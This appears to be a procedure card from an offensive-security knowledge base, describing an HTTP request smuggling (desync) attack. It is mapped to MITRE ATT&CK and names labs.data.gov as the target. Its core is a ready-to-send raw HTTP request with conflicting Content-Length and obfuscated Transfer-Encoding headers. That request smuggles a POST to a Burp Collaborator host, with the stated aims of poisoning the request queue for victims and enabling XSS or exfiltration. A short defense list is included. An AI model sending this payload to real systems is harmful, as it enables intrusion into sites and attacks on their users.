---
tags:
  - http-request-smuggling
  - desync
  - exploitation
type: procedure
tools:
  - '[[tools/Turbo-Intruder]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/send-crafted-http-request]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 37d71f41-6cb6-4a67-871a-d49748f1b13f
created_at: '2025-12-13T09:01:22.503Z'
updated_at: '2025-12-13T09:01:22.503Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send HTTP Desync Request

## Summary

This procedure sends a crafted HTTP request exploiting request smuggling by using chunked Transfer-Encoding to smuggle a malicious POST request with a Burp Collaborator domain, desynchronizing server parsing.

## Description

The request targets the root endpoint of labs.data.gov, leveraging a disagreement between front-end (Transfer-Encoding) and back-end (Content-Length) parsing. This poisons subsequent requests, potentially leading to XSS or data exfiltration.

## Requirements

1. Prepared Turbo Intruder script from prior step
2. Burp Collaborator domain ready
3. Network access to https://labs.data.gov

## Defense

Defensive measures and detection strategies:

- Normalize HTTP requests to prevent header conflicts
- Log and alert on chunked encoding anomalies

## Objectives

1. Exploit desync vulnerability
2. Smuggle malicious Host header
3. Poison request queue for victims

## Instructions

### Step 1: Execute the Crafted Request

**Context**: Send the desync request to the target server.

Execute [[commands/send-crafted-http-request]]:

```http
POST / HTTP/1.1
Host: labs.data.gov
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

> Sends a crafted HTTP request to exploit the smuggling vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/send-crafted-http-request]]

## Tools Used

- [[tools/Turbo-Intruder]]
- [[tools/Burp-Collaborator]]

## Tags

- [[http-request-smuggling]]
- [[exploitation]]
